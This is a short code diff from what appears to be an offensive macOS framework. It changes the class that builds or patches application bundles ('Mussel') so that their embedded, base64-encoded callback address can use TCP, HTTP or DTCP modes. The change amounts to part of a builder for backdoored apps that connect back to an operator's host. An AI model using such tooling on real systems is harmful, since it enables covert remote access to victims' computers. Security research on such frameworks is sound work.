@@ -29,7 +29,13 @@ import plistlib
 from pex.string import String
 
 from alive_progress import alive_bar
+
 from seashell.lib.config import Config
+from seashell.core.device import (
+    MODE_TCP,
+    MODE_HTTP,
+    MODE_DTCP,
+)
 
 
 class App(Config):
@@ -39,16 +45,17 @@ class App(Config):
     an interface to build or patch macOS application bundles.
     """
 
-    def __init__(self, host: str, port: int) -> None:
+    def __init__(self, host: str, port: int, mode: str = MODE_TCP) -> None:
         """ Initialize application builder.
 
         :param str host: host to connect to
         :param int port: port to connect to
+        :param str mode: mode to use for payload
         :return None: None
         """
 
         self.hash = String().base64_string(
-            f'tcp://{str(host)}:{str(port)}', decode=True)
+            f'{mode}://{str(host)}:{str(port)}', decode=True)
 
         self.app_name = 'Mussel'
         self.bundle_id = 'com.entysec.mussel'
